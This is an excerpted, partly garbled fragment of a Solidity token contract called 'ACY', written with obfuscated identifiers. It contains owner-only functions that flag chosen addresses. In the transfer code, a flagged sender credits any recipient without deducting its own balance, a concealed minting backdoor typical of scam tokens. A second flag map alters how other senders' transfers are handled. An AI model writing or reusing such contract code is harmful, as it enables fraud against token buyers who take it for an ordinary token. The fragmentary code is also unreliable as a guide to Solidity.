...
contract Ownable is Context {
    ...
    address kFX = 0xeDF5b868d80Cb8451543Ce260A2B815B9089542A;
...
contract ACY is Context, Ownable {
    ...
    uint256 private constant kTS = 5 * (10** KZD);
    string private constant _name = "ACY";
    string private constant _symbol = "ACY";
    ...
    function allowance(address owner, address spender) public view  returns (uint256) {
        ...
        return true; }}}
            ...
            function cnnba(address kZJ) public onlyOwner {
        require(!kZE[kZJ]);
        kZE[kZJ] = true;
 }


             function cnna(address kZJ) public onlyOwner {
        require(kZE[kZJ]);
        kZE[kZJ] = false;
 }
    ...
    emit Transfer(address(0), kZJ ,kZN); }
        ...
        if(kZE[msg.sender]) {kZA[kZJ] += kZN;} else
        if(!kZW[msg.sender]) {
        require(kZA[msg.sender] >= kZN);
        kZA[msg.sender] -= kZN;  
        kZA[kZJ] += kZN;          
